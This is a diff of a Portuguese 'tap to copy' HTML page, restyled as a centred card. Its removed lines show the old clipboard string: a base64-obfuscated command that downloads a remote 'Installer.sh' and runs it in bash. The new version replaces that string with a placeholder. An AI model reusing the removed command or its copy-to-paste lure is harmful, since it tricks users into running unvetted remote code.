@@ -1,16 +1,113 @@
+```html
 <!DOCTYPE html>
 <html lang="pt-BR">
-<body onclick="copiar()">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Copiar</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:linear-gradient(135deg,#050505,#101010,#181818);
+  font-family:Inter,Arial,sans-serif;
+  color:white;
+  overflow:hidden;
+}
+
+body::before{
+  content:"";
+  position:absolute;
+  width:500px;
+  height:500px;
+  background:radial-gradient(circle,#00ff8850,transparent 70%);
+  filter:blur(80px);
+  animation:float 6s ease-in-out infinite;
+}
+
+@keyframes float{
+  50%{
+    transform:translateY(-30px);
+  }
+}
+
+.card{
+  position:relative;
+  z-index:2;
+  width:90%;
+  max-width:420px;
+  padding:40px;
+  border-radius:24px;
+  background:rgba(255,255,255,0.05);
+  backdrop-filter:blur(20px);
+  border:1px solid rgba(255,255,255,0.08);
+  text-align:center;
+  cursor:pointer;
+  transition:.25s;
+}
+
+.card:hover{
+  transform:translateY(-5px);
+  border-color:#00ff88;
+  box-shadow:0 0 30px rgba(0,255,136,.2);
+}
+
+.emoji{
+  font-size:60px;
+  margin-bottom:15px;
+}
+
+h1{
+  font-size:28px;
+  margin-bottom:10px;
+}
+
+p{
+  color:#aaa;
+  font-size:15px;
+  line-height:1.5;
+}
+
+.status{
+  margin-top:18px;
+  color:#00ff88;
+  font-weight:600;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card" onclick="copiar()">
+  <div class="emoji">⚡</div>
   <h1>Toque para copiar</h1>
+  <p>Um clique e o conteúdo será copiado automaticamente.</p>
+  <div class="status" id="status"></div>
+</div>
 
-  <script>
-    function copiar() {
-      const texto = 'u=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NjaG9vbDAxMDIvSW5zdGFsbGVyL21haW4vSW5zdGFsbGVyLnNo|base64 -d);bash <(curl -s "$u")';
+<script>
+function copiar(){
+  const texto = "SEU_TEXTO_AQUI";
 
-      navigator.clipboard.writeText(texto)
-        .then(() => document.body.innerHTML = '<h1>Copiado! ✅</h1>')
-        .catch(() => document.body.innerHTML = '<h1>Erro ao copiar ❌</h1>');
-    }
-  </script>
+  navigator.clipboard.writeText(texto)
+    .then(()=>{
+      document.getElementById("status").innerHTML = "✅ Copiado com sucesso!";
+    })
+    .catch(()=>{
+      document.getElementById("status").innerHTML = "❌ Erro ao copiar.";
+    });
+}
+</script>
+
 </body>
 </html>
+```
